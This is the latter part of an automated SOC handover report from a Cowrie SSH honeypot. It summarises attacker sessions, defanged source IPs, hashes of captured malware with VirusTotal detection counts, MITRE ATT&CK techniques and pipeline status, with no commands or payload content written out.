| `2026-03-26 21:46:07` | `cowrie.login.success` |
| `2026-03-26 21:46:07` | `cowrie.session.params` |
| `2026-03-26 21:46:07` | `cowrie.command.input` |
| `2026-03-26 21:46:07` | `cowrie.command.failed` |
| `2026-03-26 21:46:07` | `cowrie.log.closed` |
| `2026-03-26 21:46:08` | `cowrie.session.params` |
| `2026-03-26 21:46:08` | `cowrie.command.input` |
| `2026-03-26 21:46:08` | `cowrie.session.file_download` |
| `2026-03-26 21:46:08` | `cowrie.log.closed` |
| `2026-03-26 21:46:24` | `cowrie.session.params` |
| `2026-03-26 21:46:24` | `cowrie.command.input` |
| `2026-03-26 21:46:24` | `cowrie.log.closed` |
| `2026-03-26 21:46:24` | `cowrie.session.params` |
| `2026-03-26 21:46:24` | `cowrie.command.input` |
| `2026-03-26 21:46:25` | `cowrie.log.closed` |
| `2026-03-26 21:46:25` | `cowrie.session.params` |
| `2026-03-26 21:46:25` | `cowrie.command.input` |
| `2026-03-26 21:46:25` | `cowrie.session.file_download` |
| `2026-03-26 21:46:25` | `cowrie.log.closed` |
| `2026-03-26 21:46:25` | `cowrie.session.params` |
| `2026-03-26 21:46:25` | `cowrie.command.input` |
| `2026-03-26 21:46:25` | `cowrie.log.closed` |
| `2026-03-26 21:46:26` | `cowrie.session.params` |
| `2026-03-26 21:46:26` | `cowrie.command.input` |
| `2026-03-26 21:46:26` | `cowrie.log.closed` |
| `2026-03-26 21:46:26` | `cowrie.session.params` |
| `2026-03-26 21:46:26` | `cowrie.command.input` |
| `2026-03-26 21:46:26` | `cowrie.command.input` |
| `2026-03-26 21:46:26` | `cowrie.log.closed` |
| `2026-03-26 21:46:27` | `cowrie.session.params` |
| `2026-03-26 21:46:27` | `cowrie.command.input` |
| `2026-03-26 21:46:27` | `cowrie.log.closed` |
| `2026-03-26 21:46:27` | `cowrie.session.params` |
| `2026-03-26 21:46:27` | `cowrie.command.input` |
| `2026-03-26 21:46:28` | `cowrie.log.closed` |
| `2026-03-26 21:46:28` | `cowrie.session.params` |
| `2026-03-26 21:46:28` | `cowrie.command.input` |
| `2026-03-26 21:46:28` | `cowrie.log.closed` |
| `2026-03-26 21:46:29` | `cowrie.session.params` |
| `2026-03-26 21:46:29` | `cowrie.command.input` |
| `2026-03-26 21:46:29` | `cowrie.log.closed` |
| `2026-03-26 21:46:30` | `cowrie.session.params` |
| `2026-03-26 21:46:30` | `cowrie.command.input` |
| `2026-03-26 21:46:30` | `cowrie.log.closed` |
| `2026-03-26 21:46:30` | `cowrie.session.params` |
| `2026-03-26 21:46:30` | `cowrie.command.input` |
| `2026-03-26 21:46:31` | `cowrie.log.closed` |
| `2026-03-26 21:46:31` | `cowrie.session.params` |
| `2026-03-26 21:46:31` | `cowrie.command.input` |
| `2026-03-26 21:46:31` | `cowrie.log.closed` |
| `2026-03-26 21:46:32` | `cowrie.session.params` |
| `2026-03-26 21:46:32` | `cowrie.command.input` |
| `2026-03-26 21:46:32` | `cowrie.log.closed` |
| `2026-03-26 21:46:32` | `cowrie.session.params` |
| `2026-03-26 21:46:32` | `cowrie.command.input` |
| `2026-03-26 21:46:32` | `cowrie.log.closed` |
| `2026-03-26 21:46:33` | `cowrie.session.params` |
| `2026-03-26 21:46:33` | `cowrie.command.input` |
| `2026-03-26 21:46:33` | `cowrie.log.closed` |
| `2026-03-26 21:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.121[.]78` to AbuseIPDB if not already reported
- [ ] Block `14.103.121[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `180.153.91[.]15` | **21** | 2026-03-26 21:28 | 2026-03-26 21:59 | 40m | 0 | `T1592` | 🟠 MEDIUM |
| `3.142.97[.]232` | **3** | 2026-03-26 21:09 | 2026-03-26 21:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `14.103.121[.]78` | **2** | 2026-03-26 21:46 | 2026-03-26 21:48 | 4m | 0 | `T1592` | 🟢 LOW |
| `180.76.96[.]235` | **2** | 2026-03-26 21:33 | 2026-03-26 21:36 | 4m | 0 | `T1592` | 🟢 LOW |
| `20.221.56[.]179` | **2** | 2026-03-26 21:55 | 2026-03-26 21:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.171.69[.]82` | 1 | 2026-03-26 21:31 | 2026-03-26 21:31 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.30.127[.]9` | 1 | 2026-03-26 20:49 | 2026-03-26 20:49 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.173.19[.]29` | 1 | 2026-03-26 20:39 | 2026-03-26 20:39 | 13s | 0 | `T1592` | 🟢 LOW |
| `117.252.93[.]114` | 1 | 2026-03-26 20:46 | 2026-03-26 20:46 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.222[.]56` | 1 | 2026-03-26 21:08 | 2026-03-26 21:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.248.104[.]19` | 1 | 2026-03-26 21:02 | 2026-03-26 21:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.124.60[.]46` | 1 | 2026-03-26 22:10 | 2026-03-26 22:10 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.123.87[.]143` | 1 | 2026-03-26 22:17 | 2026-03-26 22:17 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.248.19[.]102` | 1 | 2026-03-26 21:49 | 2026-03-26 21:49 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.163.22[.]86` | 1 | 2026-03-26 21:29 | 2026-03-26 21:29 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.151[.]11` | 1 | 2026-03-26 22:08 | 2026-03-26 22:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]51` | 1 | 2026-03-26 22:10 | 2026-03-26 22:10 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `112.30.127[.]9` | CN | China Mobile Communications Corporation | **100** ⚠️ | 40 |
| `221.163.22[.]86` | KR | Sudogwongangnambonbujang | **100** ⚠️ | 9 |
| `103.171.69[.]82` | BD | Multilink International | **100** ⚠️ | 1 |
| `180.153.91[.]15` | CN | CHINANET SHANGHAI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `49.124.153[.]51` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 12 |
| `203.124.60[.]46` | PK | COMSATS (Commission on Science and Technology | **100** ⚠️ | 42 |
| `114.173.19[.]29` | JP | Open Computer Network | **100** ⚠️ | 0 |
| `178.178.222[.]56` | RU | PJSC MegaFon | **100** ⚠️ | 42 |
| `125.17.185[.]94` | IN | BHARTI INFOTEL LTD. | **100** ⚠️ | 50 |
| `117.252.93[.]114` | IN | CDMA Project, BSNL New Delhi | **100** ⚠️ | 9 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 53 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 11 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 6 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 62 cases |
| Tool 34  | Credential Extractor        | ✅ 20 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (17.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 9 priority case(s) shown individually · 17 recon entry/entries in table (5 group(s) consolidating 30 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-26T22:28:19Z_
